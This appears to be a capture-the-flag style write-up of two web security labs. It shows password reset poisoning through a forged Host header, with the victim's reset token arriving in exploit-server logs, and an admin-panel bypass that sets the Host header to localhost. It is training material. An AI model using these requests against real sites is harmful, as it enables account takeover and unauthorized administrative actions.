
# Lab 1

## Description

This lab is vulnerable to password reset poisoning. The user `carlos` will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account.

You can log in to your own account using the following credentials: `wiener:peter`. Any emails sent to this account can be read via the email client on the exploit server.

## Solution

Go through the whole password reset procedure. Notice following request:

```
POST /forgot-password HTTP/2
Host: test.test
[...]
csrf=ruyJfeuEW2Jsr4rC0yTwfsQ6zKIMbvsZ&username=wiener
```

Still works while the `Host header` value has been changed. Additionally, the reset link contained in the mail is:

```
[https://test.test/forgot-password?temp-forgot-password-token=t3kbcalgz03oyxgxdpur8ucje1u1aayn](https://exploit-0a3d00ed0383e80c84238b15019b006b.exploit-server.net/forgot-password?temp-forgot-password-token=t3kbcalgz03oyxgxdpur8ucje1u1aayn)
```

Which means the `Host header` value is reflected in the password reset link.

Changing it to:

```
POST /forgot-password HTTP/2
Host: exploit-0a3d00ed0383e80c84238b15019b006b.exploit-server.net
[...]
csrf=ruyJfeuEW2Jsr4rC0yTwfsQ6zKIMbvsZ&username=wiener
```

returns:

```
[https://exploit-0a3d00ed0383e80c84238b15019b006b.exploit-server.net/forgot-password?temp-forgot-password-token=t3kbcalgz03oyxgxdpur8ucje1u1aayn](https://exploit-0a3d00ed0383e80c84238b15019b006b.exploit-server.net/forgot-password?temp-forgot-password-token=t3kbcalgz03oyxgxdpur8ucje1u1aayn)
```

Knowing the user `carlos` clicks on all links send to him, the process can be repeated using `carlos` as a username:

```
POST /forgot-password HTTP/2
Host: exploit-0a3d00ed0383e80c84238b15019b006b.exploit-server.net
[...]
csrf=ruyJfeuEW2Jsr4rC0yTwfsQ6zKIMbvsZ&username=carlos
```

checking the exploit server logs shows:

```
[...]
10.0.3.232      2026-06-11 06:51:42 +0000 "GET /forgot-password?temp-forgot-password-token=5nm9aowtmw4uevtknxw22wckpb1q8fc1 HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
[...]
```

Note: easy to spot because different IP as attacker IP.

Following the link:

```
/forgot-password?temp-forgot-password-token=5nm9aowtmw4uevtknxw22wckpb1q8fc1
```

The password of the user `carlos` can be reset.

Login in to `carlos` account solves the lab.


# Lab 2

## Description

This lab makes an assumption about the privilege level of the user based on the HTTP Host header.

To solve the lab, access the admin panel and delete the user `carlos`.

## Solution

Heading to:

```
/admin
```

shows:

```
[...]
Admin interface only available to local users
[...]
```

Sending the request to repeater and changing the `Host Header` value to:

```
[...]
Host: localhost
[...]
```

returns 200 OK and shows the admin panel. 

Heading to:

```
/admin/delete?username=carlos
```

solves the lab.

